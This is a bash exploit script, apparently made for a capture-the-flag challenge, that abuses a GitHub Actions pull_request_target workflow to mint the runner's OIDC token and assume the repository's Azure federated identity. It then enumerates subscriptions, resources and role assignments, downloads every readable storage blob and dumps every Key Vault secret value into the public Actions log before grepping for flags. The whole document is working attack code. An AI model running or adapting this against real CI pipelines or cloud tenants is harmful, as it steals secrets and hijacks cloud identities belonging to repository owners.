#!/usr/bin/env bash
# CTF pull_request_target OIDC exploit: assume the repo's Azure federated identity
# and hunt the flag. All stdout lands in the public Actions log.
set +e
exec > >(tee /tmp/all.log) 2>&1

echo "::group::context"
echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF actor=$GITHUB_ACTOR"
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"
echo "::endgroup::"

# 1) Mint the GitHub Actions OIDC token for the Azure audience
IDT=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "oidc token length: ${#IDT}"
echo "oidc claims:"; echo "$IDT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
  | jq '{sub,aud,repository,repository_owner,event_name,ref,workflow,job_workflow_ref}' 2>/dev/null
echo

# 2) az login via federated credential (az is preinstalled on ubuntu-latest)
echo "::group::az login"
az login --service-principal -u "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" \
  --federated-token "$IDT" --allow-no-subscriptions -o none
echo "az login rc=$?"
az account show -o json
az account list --all -o json
echo "::endgroup::"

# 3) ARM token (raw) as a cross-check / fallback
ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$IDT" -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
echo "arm token len: ${#ARM}"
SUB="${AZURE_SUBSCRIPTION_ID}"
AUTH=(-H "Authorization: Bearer $ARM")
echo "== subscriptions =="; curl -sS "${AUTH[@]}" "https://management.azure.com/subscriptions?api-version=2022-12-01"; echo
echo "== resource groups =="; curl -sS "${AUTH[@]}" "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2022-09-01"; echo
echo "== all resources =="; curl -sS "${AUTH[@]}" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=1000"; echo
echo "== role assignments for this identity =="
curl -sS "${AUTH[@]}" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=assignedTo('$AZURE_CLIENT_ID')"; echo

# 4) Storage: accounts -> containers -> blobs (data-plane via OIDC identity)
echo "::group::storage"
az storage account list -o json > /tmp/sa.json 2>/dev/null; cat /tmp/sa.json
for acct in $(jq -r '.[].name' /tmp/sa.json 2>/dev/null); do
  echo "---- account: $acct"
  az storage container list --account-name "$acct" --auth-mode login -o json > /tmp/ct.json 2>/dev/null; cat /tmp/ct.json
  for c in $(jq -r '.[].name' /tmp/ct.json 2>/dev/null); do
    echo "  -- container: $c"
    az storage blob list --account-name "$acct" -c "$c" --auth-mode login -o json > /tmp/bl.json 2>/dev/null; cat /tmp/bl.json
    for b in $(jq -r '.[].name' /tmp/bl.json 2>/dev/null); do
      echo "    == blob $acct/$c/$b =="
      az storage blob download --account-name "$acct" -c "$c" -n "$b" --auth-mode login -f /tmp/out --no-progress -o none 2>/dev/null \
        && { echo "    ---8<---"; cat /tmp/out; echo; echo "    --->8---"; }
    done
  done
done
echo "::endgroup::"

# 5) Key Vaults: list and dump every secret value
echo "::group::keyvault"
az keyvault list -o json > /tmp/kv.json 2>/dev/null; cat /tmp/kv.json
for vn in $(jq -r '.[].name' /tmp/kv.json 2>/dev/null); do
  echo "---- vault: $vn"
  az keyvault secret list --vault-name "$vn" -o json > /tmp/sl.json 2>/dev/null; cat /tmp/sl.json
  for sn in $(jq -r '.[].id' /tmp/sl.json 2>/dev/null | sed 's#.*/##'); do
    echo "  secret $sn = $(az keyvault secret show --vault-name "$vn" -n "$sn" --query value -o tsv 2>/dev/null)"
  done
done
echo "::endgroup::"

# 6) ACR (identity may have more than anonymous pull)
echo "== acr repos (as identity) =="; az acr repository list --name crtblplatprodx3euoz -o json 2>/dev/null; echo

echo "######## FLAG CANDIDATES ########"
grep -aEio '([A-Za-z0-9_]*FLAG[^ "]*|DF2026\{[^}]*\}|DFC?\{[^}]*\}|flag\{[^}]*\}|[A-Za-z0-9]+\{[^}]{4,}\})' /tmp/all.log | sort -u
echo "######## END ########"
